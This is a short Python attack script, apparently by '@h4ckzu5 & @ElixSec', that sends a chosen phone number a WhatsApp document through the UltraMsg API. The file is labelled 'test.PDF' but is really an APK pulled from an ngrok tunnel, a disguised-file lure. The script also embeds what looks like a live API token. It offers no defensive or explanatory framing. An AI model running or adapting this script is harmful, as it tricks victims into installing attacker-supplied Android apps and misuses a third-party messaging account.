import requests
import argparse

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'
  
parser = argparse.ArgumentParser(description=print(  color.OKGREEN + """
                 ::::::::::::::                
              :::::cloddddolc:::::             
          ::::cdOXWMMMMMMMMMMWXOdc:::          
       ::::xKMMMMMMMMMMMMMMMMMMMMKd::::        
      :::ckWMMMMMMMMMMMMMMMMMMMMMMMMWk:::      
     :::oNMMMMNkddkMMMMMMMMMMMMMMMMMMMNo:::    
    :::xMMMMM0:::::OMMMMMMMMMMMMMMMMMMMMd:::   
   :::dMMMMMWc::::::KMMMMMMMMMMMMMMMMMMMMo:::  
  ::::NMMMMMMc:::::cKMMMMMMMMMMMMMMMMMMMMN:::: 
  :::dMMMMMMMK::::lWMMMMMMMMMMMMMMMMMMMMMMo::: 
  :::xMMMMMMMMKc:::dWMMMMMMMMMMMMMMMMMMMMMd::: 
  :::dMMMMMMMMMWd:::cOWMMMMMMWWMMMMMMMMMMMo::: 
   :::NMMMMMMMMMMKl:::cxKWMWk::lx0WMMMMMMX:::: 
   :::dMMMMMMMMMMMMKo:::::lc:::::::KMMMMWo:::  
    :::xMMMMMMMMMMMMMNOdc:::::::::oWMMMWd:::   
     :::oMMMMMMMMMMMMMMMMN0kdoodOXMMMMXl:::    
     :::OMMMMMMMMMMMMMMMMMMMMMMMMMMMNx:::      
     ::oMMMMMNWMMMMMMMMMMMMMMMMMMW0d:::        
    :::00kd::::::kKNMMMMMMMMMMNKko::::         
   :::::::::lo::::::cloooolc::::::             
  :::           :::::::::::::::         @h4ckzu5 & @ElixSec

╦ ╦┬ ┬┌─┐┌┬┐┌─┐╔═╗┌─┐┌─┐   ┌─┐─┐ ┬┌┬┐┌─┐┌┐┌┌─┐┬┌─┐┌┐┌   ┌┬┐┌─┐┌┐┌┬┌─┐┬ ┬┬  ┌─┐┌┬┐┬┌─┐┌┐┌  
║║║├─┤├─┤ │ └─┐╠═╣├─┘├─┘───├┤ ┌┴┬┘ │ ├┤ │││└─┐││ ││││───│││├─┤││││├─┘│ ││  ├─┤ │ ││ ││││  
╚╩╝┴ ┴┴ ┴ ┴ └─┘╩ ╩┴  ┴     └─┘┴ └─ ┴ └─┘┘└┘└─┘┴└─┘┘└┘   ┴ ┴┴ ┴┘└┘┴┴  └─┘┴─┘┴ ┴ ┴ ┴└─┘┘└┘  """ + color.END))
parser.add_argument("--to", required=True, help="Número de teléfono del destinatario (con código de país, e.g., +52...")

args = parser.parse_args()

url = "https://api.ultramsg.com/instance110175/messages/document?token=119j5ajairnd2lm2&priority=10"

payload = {
    "to": args.to,
    "filename": "test.PDF",
    "document": "https://751d-2806-2f0-a041-f52a-da00-b151-12a-5cdb.ngrok-free.app/BlackMart.apk",    
    "referenceId": ""
}

headers = {"Content-Type": "application/x-www-form-urlencoded"}

response = requests.post(url, data=payload, headers=headers)

print(response.text)
